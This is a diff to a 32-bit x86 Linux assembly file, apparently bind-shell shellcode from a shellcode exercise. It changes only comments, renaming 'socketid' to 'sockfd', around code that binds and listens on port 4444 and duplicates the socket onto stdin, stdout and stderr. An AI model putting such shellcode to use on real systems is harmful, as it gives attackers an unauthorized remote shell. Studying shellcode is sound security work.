@@ -28,7 +28,7 @@ _start:
 ;
 ;  socketcall(int call, bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen))
 ;  eax:		ebx:				ecx:
-;  0x66		call = 0x2 (SYS_BIND)		*args = {sockfd = socketid = eax, sockaddr = [0x2 (AF_INET), port = 115C (4444), address = 0x0], addrlen = 0x10}
+;  0x66		call = 0x2 (SYS_BIND)		*args = {sockfd = eax, sockaddr = [0x2 (AF_INET), port = 115C (4444), address = 0x0], addrlen = 0x10}
 ;
 	pop ebx
 	pop esi
@@ -38,7 +38,7 @@ _start:
 	push word 0x02	; value for AF_INET
 	push byte +0x10
 	push ecx	; push the address that store value of sockaddr to stack
-	push eax	; eax was set to the value of socketid after the socket call 
+	push eax	; eax was set to the value of sockfd after the socket call 
 	mov ecx,esp	; ecx points to addr of current stack
 	push byte +0x66 ; 0x66 systemcall for socketcall
 	pop eax
@@ -46,9 +46,9 @@ _start:
 ;
 ;  socketcall(int call, listen(int sockfd, int backlog))
 ;  eax:		ebx:				ecx:
-;  0x66		call = 0x4 (SYS_LISTEN)		socketid = eax
+;  0x66		call = 0x4 (SYS_LISTEN)		sockfd = eax
 ;
-	mov [ecx+0x4],eax	; modify the the stack ecx is pointing to to socketid
+	mov [ecx+0x4],eax	; modify the the stack ecx is pointing to to sockfd
 	mov bl,0x4		; socket call for listen
 	mov al,0x66		; 0x66 systemcall for socketcall
 	int 0x80
@@ -63,7 +63,7 @@ _start:
 ;
 ;  dup2(int oldfd, int newfd, int flags)
 ;  eax:		ebx:			ecx:
-;  0x3f		oldfd = socketid	newfd = stdin(0), stdout(1) and stderr(2)
+;  0x3f		oldfd = sockfd		newfd = stdin(0), stdout(1) and stderr(2)
 ;
 	xchg eax,ebx
 	pop ecx
